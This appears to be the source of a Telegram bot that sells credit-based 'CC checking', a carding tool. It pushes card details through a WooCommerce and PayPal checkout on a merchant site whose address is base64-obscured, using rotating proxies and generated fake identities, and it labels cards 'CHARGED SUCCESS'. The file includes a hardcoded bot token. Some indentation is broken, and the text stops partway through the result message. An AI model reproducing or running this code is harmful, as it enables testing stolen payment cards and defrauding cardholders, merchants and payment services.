import sqlite3
import aiohttp
import asyncio
import requests
import re
import random
import string
import time
import base64
from datetime import datetime
from requests_toolbelt.multipart.encoder import MultipartEncoder
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.error import BadRequest
import logging
import concurrent.futures
from threading import Lock

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Deployment verification timestamp
DEPLOYMENT_TIMESTAMP = "2025-01-15 18:45:00 UTC"
print(f"Bot deployment timestamp: {DEPLOYMENT_TIMESTAMP}")
logger.info(f"Bot started with deployment timestamp: {DEPLOYMENT_TIMESTAMP}")

# Bot configuration
BOT_TOKEN = "8102305783:AAFimgJTNn7JeqZm-Ex32Nv5QOnm_QOcq14"  # Replace with your actual bot token
ADMIN_ID = 7451622773  # Replace with your admin's Telegram user ID
REGISTRATION_CHANNEL = "-1002237023678"  # Replace with registration channel ID
RESULTS_CHANNEL = "-1002158129417"  # Replace with results channel ID

# Enhanced concurrency management
active_checks = set()
check_stats = {}
stats_lock = Lock()
user_semaphores = {}  # Per-user semaphores to limit concurrent requests
max_concurrent_per_user = 5  # Maximum concurrent checks per user
global_semaphore = asyncio.Semaphore(100)  # Global limit for all users

# Initialize SQLite database
def init_db():
    try:
        conn = sqlite3.connect("cc_users.db")
        c = conn.cursor()
        c.execute(
            """CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                join_date TEXT,
                credits INTEGER
            )"""
        )
        conn.commit()
    except sqlite3.Error as e:
        logger.error(f"Database initialization error: {str(e)}")
    finally:
        conn.close()

# Get user data from database
def get_user(user_id):
    try:
        conn = sqlite3.connect("cc_users.db")
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = c.fetchone()
        return user
    except sqlite3.Error as e:
        logger.error(f"Database get_user error: {str(e)}")
        return None
    finally:
        conn.close()

# Register new user
def register_user(user_id, username, join_date):
    try:
        conn = sqlite3.connect("cc_users.db")
        c = conn.cursor()
        c.execute(
            "INSERT OR IGNORE INTO users (user_id, username, join_date, credits) VALUES (?, ?, ?, ?)",
            (user_id, username, join_date, 10),
        )
        conn.commit()
    except sqlite3.Error as e:
        logger.error(f"Database register_user error: {str(e)}")
    finally:
        conn.close()

# Update user credits
def update_credits(user_id, amount, add=False):
    try:
        conn = sqlite3.connect("cc_users.db")
        c = conn.cursor()
        if add:
            c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
        else:
            c.execute("UPDATE users SET credits = ? WHERE user_id = ?", (amount, user_id))
        conn.commit()
    except sqlite3.Error as e:
        logger.error(f"Database update_credits error: {str(e)}")
    finally:
        conn.close()

# Get all users (for admin)
def get_all_users():
    try:
        conn = sqlite3.connect("cc_users.db")
        c = conn.cursor()
        c.execute("SELECT * FROM users")
        users = c.fetchall()
        return users
    except sqlite3.Error as e:
        logger.error(f"Database get_all_users error: {str(e)}")
        return []
    finally:
        conn.close()

# CC Checker Functions (from pp.py)
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour",
                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]

    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                  "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
                  "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
                  "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
                  "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
                  "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
                  "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
                  "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]

    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

def load_proxies():
    try:
        with open("proxy.txt", "r") as f:
            proxies = []
            for line in f:
                line = line.strip()
                if not line:
                    continue

                parts = line.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    proxy = f"http://{user}:{pwd}@{host}:{port}"
                else:
                    proxy = line  # already formatted
                proxies.append(proxy)
            return proxies
    except:
        return []

def get_random_proxy():
    proxies = load_proxies()
    if proxies:
        return random.choice(proxies)
    return None

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]
    return city, state, street_address, zip_code

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone_number():
    return ''.join(random.choices(string.digits, k=10))

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

import asyncio
import httpx

# Fast BIN lookup using multiple APIs with better error handling
async def fetch_bin_fast(bin_number):
    """Fast BIN lookup using bincheck.io API"""
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            response = await client.get(f'https://bincheck.io/api/{bin_number}')
            if response.status_code == 200:
                data = response.json()
                if data and data.get('success'):
                    bin_data = data.get('bin', {})
                    country_data = bin_data.get('country', {})
                    return {
                        'brand': bin_data.get('scheme', 'VISA').upper(),
                        'type': bin_data.get('type', 'DEBIT').upper(),
                        'level': bin_data.get('level', 'CLASSIC').upper(),
                        'bank': bin_data.get('bank', 'UNKNOWN BANK'),
                        'country': country_data.get('name', 'UNITED STATES'),
                        'emoji': country_data.get('emoji', '🇺🇸')
                    }
    except Exception as e:
        logger.warning(f"bincheck.io API error: {str(e)}")
    return None

# Fallback BIN lookup for multiple APIs with faster timeouts
async def fetch_bin_fallback(api_url):
    try:
        async with httpx.AsyncClient(timeout=3.0) as client:
            response = await client.get(api_url)
        if response.status_code == 200:
            data = response.json()
            if data and isinstance(data, dict):
                if 'binlist.net' in api_url:
                    country = data.get('country', {})
                    bank = data.get('bank', {})
                    return {
                        'brand': data.get('brand', 'VISA').upper(),
                        'type': data.get('type', 'DEBIT').upper(),
                        'level': data.get('brand', 'CLASSIC').upper(),
                        'bank': bank.get('name', 'UNKNOWN BANK'),
                        'country': country.get('name', 'UNITED STATES'),
                        'emoji': country.get('emoji', '🇺🇸')
                    }
                elif 'bins.su' in api_url:
                    return {
                        'brand': data.get('vendor', 'VISA').upper(),
                        'type': data.get('type', 'DEBIT').upper(),
                        'level': data.get('level', 'CLASSIC').upper(),
                        'bank': data.get('bank', 'UNKNOWN BANK'),
                        'country': data.get('country_name', 'UNITED STATES'),
                        'emoji': data.get('country_flag', '🇺🇸')
                    }
    except Exception as e:
        logger.warning(f"Error fetching {api_url}: {e}")
    return None

async def get_bin_info_async(bin_number):
    """Optimized BIN lookup with fast primary API and fallbacks"""
    # Try fast bincheck.io API first with timeout
    try:
        result = await asyncio.wait_for(fetch_bin_fast(bin_number), timeout=3.0)
        if result:
            return result
    except asyncio.TimeoutError:
        logger.warning(f"BIN lookup timeout for {bin_number}")
    except Exception as e:
        logger.warning(f"BIN lookup error for {bin_number}: {str(e)}")
    
    # Quick fallback - try one API with short timeout
    try:
        fallback_result = await asyncio.wait_for(
            fetch_bin_fallback(f'https://lookup.binlist.net/{bin_number}'), 
            timeout=2.0
        )
        if fallback_result:
            return fallback_result
    except:
        pass

    # Final fallback with reasonable defaults based on BIN
    brand = 'VISA' if bin_number.startswith(('4',)) else 'MASTERCARD' if bin_number.startswith(('5',)) else 'UNKNOWN'
    return {
        'brand': brand,
        'type': 'DEBIT', 
        'level': 'CLASSIC',
        'bank': 'UNKNOWN BANK',
        'country': 'UNITED STATES',
        'emoji': '🇺🇸'
    }

# Optimized synchronous wrapper with caching
_bin_cache = {}
_cache_lock = asyncio.Lock()

def get_bin_info(bin_number):
    """Synchronous wrapper with basic caching for performance"""
    # Check cache first
    if bin_number in _bin_cache:
        return _bin_cache[bin_number]
    
    # Get new event loop if none exists
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    result = loop.run_until_complete(get_bin_info_async(bin_number))
    
    # Cache result for future use (limit cache size)
    if len(_bin_cache) < 1000:
        _bin_cache[bin_number] = result
    
    return result

async def check_card_async(cc_line, proxies=None, user_info=None):
    start_time = time.time()
    
    try:
        ccx = cc_line.strip()
        parts = ccx.split('|')
        if len(parts) != 4:
            raise ValueError("Invalid card format")
        
        n, mm, yy, cvc = parts
        if "20" in yy:
            yy = yy.split("20")[1]

        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        phone = generate_phone_number()
        user = generate_user_agent()
        corr = generate_random_code()
        sess = generate_random_code()
        
        # Use more generous timeouts to match pp.py behavior
        timeout = aiohttp.ClientTimeout(total=60, connect=15, sock_read=30)
        connector = aiohttp.TCPConnector(
            limit=100, 
            limit_per_host=30,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=30,
            enable_cleanup_closed=True
        )
        async with aiohttp.ClientSession(
            timeout=timeout, 
            connector=connector,
            headers={'User-Agent': user}
        ) as session:

            # Encoded site URL to prevent leaking
            encoded_site = base64.b64decode('c3dpdGNodXBjYi5jb20=').decode('utf-8')
            site_url = f'https://{encoded_site}'

            # Get a random proxy for this request
            proxy = get_random_proxy()
            
            # Step 1: Add to cart - optimized with faster processing
            form_data = aiohttp.FormData()
            form_data.add_field('quantity', '1')
            form_data.add_field('add-to-cart', '4451')
            
            headers = {
                'user-agent': user,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.5',
                'origin': site_url,
                'referer': f'{site_url}/shop/i-buy/',
            }
            
        try:
                async with session.post(f'{site_url}/shop/i-buy/', headers=headers, data=form_data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as response:
                    if response.status != 200:
                        logger.warning(f"Add to cart failed with status {response.status}")
                    await response.text()
            except asyncio.TimeoutError:
                logger.warning("Add to cart timeout")
            except Exception as e:
                logger.warning(f"Add to cart error: {str(e)}")

            # Step 2: Go to checkout - optimized
            headers = {
                'user-agent': user,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'referer': f'{site_url}/cart/',
            }
            
            try:
                async with session.get(f'{site_url}/checkout/', headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as response:
                    if response.status != 200:
                        raise Exception(f"Checkout page failed with status {response.status}")
                    checkout_text = await response.text()
            except asyncio.TimeoutError:
                raise Exception("Checkout page timeout")
            except Exception as e:
                raise Exception(f"Checkout page error: {str(e)}")

            # Extract tokens with better error handling
            try:
                sec = re.search(r'update_order_review_nonce":"(.*?)"', checkout_text).group(1)
                nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', checkout_text).group(1)
                check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', checkout_text).group(1)
                create = re.search(r'create_order.*?nonce":"(.*?)"', checkout_text).group(1)
            except (AttributeError, IndexError) as e:
                raise Exception(f"Failed to extract required tokens: {str(e)}")

            # Step 3: Update order review
            headers = {
                'authority': encoded_site,
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': site_url,
                'referer': f'{site_url}/checkout/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
            }
            
            params = {'wc-ajax': 'update_order_review'}
            data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D%28none%29&wc_order_attribution_session_entry=https%253A%252F%252F{encoded_site}%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%2F%3Fwc-ajax%3Dupdate_order_review'
            
            try:
                async with session.post(site_url, params=params, headers=headers, data=data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as response:
                    await response.text()
            except Exception as e:
                logger.warning(f"Update order review error: {str(e)}")

            # Step 4: Create PayPal order
            headers = {
                'authority': encoded_site,
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': site_url,
                'pragma': 'no-cache',
                'referer': f'{site_url}/checkout/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
            }
            
            params = {'wc-ajax': 'ppc-create-order'}
            json_data = {
                'nonce': create,
                'payer': None,
                'bn_code': 'Woo_PPCP',
                'context': 'checkout',
                'order_id': '0',
                'payment_method': 'ppcp-gateway',
                'funding_source': 'card',
                'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic%3D%28none%29&wc_order_attribution_session_entry={site_url}/shop/i-buy/&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
                'createaccount': False,
                'save_payment_method': False,
            }
            
            try:
                async with session.post(site_url, params=params, headers=headers, json=json_data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as response:
                    paypal_response = await response.json()
            except Exception as e:
                raise Exception(f"PayPal order creation error: {str(e)}")
        
        id = paypal_response['data']['id']
        pcp = paypal_response['data']['custom_id']

        # Step 5: Process payment
        lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
        
        session_id = f'uid_{lol1}_{lol3}'
        button_session_id = f'uid_{lol2}_{lol3}'
        
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
            'referer': 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_378e07784c_mtc6nde6ndk&buttonSize=large&customerId=&clientID=AY7TjJuH5RtvCuEf2ZgEVKs3quu69UggsCg29lkrb3kvsdGcX2ljKidYXXHPParmnymd9JacfRh0hzEp&clientMetadataID=uid_b5c925a7b4_mtc6nde6ndk&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=venmo&enableFunding.1=paylater&env=production&experiment.enableVenmo=true&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjpmYWxzZSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpdLmF1dGhvcml0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'iframe',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user,
            }
        params = {
            'sessionID': session_id,
                'buttonSessionID': button_session_id,
                'locale.x': 'ar_EG',
                'commit': 'true',
                'hasShippingCallback': 'false',
                'env': 'production',
                'country.x': 'EG',
                'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
            }
            
            try:
                async with session.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as response:
                    await response.text()
            except Exception as e:
                logger.warning(f"PayPal card fields error: {str(e)}")

            # Step 6: Submit payment
            headers = {
                'authority': 'my.tinyinstaller.top',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
                'content-type': 'application/json',
                'origin': 'https://my.tinyinstaller.top',
                'referer': 'https://my.tinyinstaller.top/checkout/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
            }
            
            json_data = {
                'query': '''
                    mutation payWithCard(
                        $token: String!,
                        $card: CardInput!,
                        $phoneNumber: String,
                        $firstName: String,
                        $lastName: String,
                        $shippingAddress: AddressInput,
                        $billingAddress: AddressInput,
                        $email: String,
                        $currencyConversionType: CheckoutCurrencyConversionType,
                        $installmentTerm: Int,
                        $identityDocument: IdentityDocumentInput
                    ) {
                        approveGuestPaymentWithCreditCard(
                            token: $token,
                            card: $card,
                            phoneNumber: $phoneNumber,
                            firstName: $firstName,
                            lastName: $lastName,
                            email: $email,
                            shippingAddress: $shippingAddress,
                            billingAddress: $billingAddress,
                            currencyConversionType: $currencyConversionType,
                            installmentTerm: $installmentTerm,
                            identityDocument: $identityDocument
                        ) {
                            flags {
                                is3DSecureRequired
                            }
                            cart {
                                intent
                                cartId
                                buyer {
                                    userId
                                    auth {
                                        accessToken
                                    }
                                }
                            }
                            paymentContingencies {
                                threeDomainSecure {
                                    status
                                    method
                                    redirectUrl {
                                        href
                                    }
                                    parameter
                                }
                            }
                        }
                    }
                ''',
                'variables': {
                    'token': id,
                    'card': {
                        'cardNumber': n,
                        'type': 'VISA',
                        'expirationDate': mm + '/20' + yy,
                        'postalCode': zip_code,
                        'securityCode': cvc,
                    },
                    'phoneNumber': phone,
                    'firstName': first_name,
                    'lastName': last_name,
                    'shippingAddress': {
                        'givenName': first_name,
                        'familyName': last_name,
                        'line1': 'New York',
                        'line2': None,
                        'city': 'New York',
                        'state': 'NY',
                        'postalCode': '10080',
                        'country': 'US',
                    },
                    'billingAddress': {
                        'givenName': first_name,
                        'familyName': last_name,
                        'line1': 'New York',
                        'line2': None,
                        'city': 'New York',
                        'state': 'NY',
                        'postalCode': '10080',
                        'country': 'US',
                    },
                    'email': acc,
                    'currencyConversionType': 'VENDOR',
                    'installmentTerm': None,
                    'identityDocument': None
                },
                'operationName': 'payWithCard',
            }
            
            # Use aiohttp for final payment request
            try:
                async with session.post(
                    'https://www.paypal.com/graphql?fetch_credit_form_submit',
                    headers=headers,
                    json=json_data,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as response:
                    last = await response.text()
            except Exception as e:
                raise Exception(f"Payment submission error: {str(e)}")
        
        # Get BIN info asynchronously with timeout for better performance
        try:
            bin_info = await asyncio.wait_for(get_bin_info_async(n[:6]), timeout=5.0)
        except asyncio.TimeoutError:
            logger.warning(f"BIN lookup timeout for {n[:6]}")
            brand = 'VISA' if n.startswith('4') else 'MASTERCARD' if n.startswith('5') else 'UNKNOWN'
            bin_info = {
                'brand': brand,
                'type': 'DEBIT',
                'level': 'CLASSIC',
                'bank': 'UNKNOWN BANK',
                'country': 'UNITED STATES',
                'emoji': '🇺🇸'
            }
        except Exception as e:
            logger.warning(f"BIN lookup error for {n[:6]}: {str(e)}")
            brand = 'VISA' if n.startswith('4') else 'MASTERCARD' if n.startswith('5') else 'UNKNOWN'
            bin_info = {
                'brand': brand,
                'type': 'DEBIT',
                'level': 'CLASSIC', 
                'bank': 'UNKNOWN BANK',
                'country': 'UNITED STATES',
                'emoji': '🇺🇸'
            }

        elapsed_time = time.time() - start_time

        # Get user info for response
        checked_by = "@xxxxxxxx007xxxxxxxx"
        credits_left = "∞"
        if user_info:
            checked_by = f"<a href='tg://user?id={user_info['user_id']}'>{user_info['username']}</a>"
            credits_left = "∞" if user_info['user_id'] == ADMIN_ID else str(user_info['credits'])

        if (
            'ADD_SHIPPING_ERROR' in last or
            '"status": "succeeded"' in last or
            'Thank You For Donation.' in last or
            'Your payment has already been processed' in last or
            'Success ' in last
        ):
            return f"""
APPROVED ✅
━━━━━━━━━━━━━━━━

[↯] 𝗖𝗰 ⇾ {ccx}
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ PAYPAL 1$
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 → CHARGED SUCCESS ✅

[↯] 𝗕𝗜𝗡 ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[↯] 𝗕𝗔𝗡𝗞 ⇾ {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⇾ {bin_info['country']} {bin_info['emoji']}

